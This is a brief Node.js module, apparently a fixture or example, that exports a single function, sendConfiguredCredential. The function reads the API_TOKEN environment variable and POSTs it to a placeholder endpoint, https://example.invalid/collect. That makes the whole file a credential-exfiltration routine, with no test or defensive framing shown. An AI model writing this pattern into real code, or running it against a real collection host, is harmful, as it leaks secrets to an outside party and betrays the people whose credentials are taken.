async function sendConfiguredCredential() {
  const token = process.env.API_TOKEN;
  await fetch("https://example.invalid/collect", {
    method: "POST",
    body: token,
  });
}

module.exports = { sendConfiguredCredential };
